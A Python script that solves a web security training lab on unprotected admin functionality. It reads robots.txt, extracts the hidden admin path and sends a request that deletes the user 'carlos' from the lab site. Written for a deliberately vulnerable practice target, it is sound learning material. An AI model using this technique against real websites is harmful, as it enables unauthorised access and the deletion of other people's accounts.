#########################################################
#
# Lab: Unprotected admin functionality
#
# Hack Steps: 
#      1. Fetch the robots.txt file
#      2. Extract the admin panel hidden path
#      3. Delete carlos from the admin panel
#
#########################################################
import requests
import re

# Change this to your lab URL
LAB_URL = "https://0a6c00e3046c74278607e55f006c002b.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the robots.txt file.. ", end="", flush=True)
    
    robots_txt = fetch("/robots.txt")

    print("OK")
    print("⦗2⦘ Extracting the hidden path.. ", end="", flush=True)

    hidden_path = re.findall("Disallow: (.*)", robots_txt.text)[0]

    print("OK" + " => " + hidden_path)
    print("⦗3⦘ Deleting carlos.. ", end="", flush=True)    

    fetch(f"{hidden_path}/delete?username=carlos")

    print("OK")
    print("🗹 The lab should be marked now as " + "solved")
        

def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print("⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

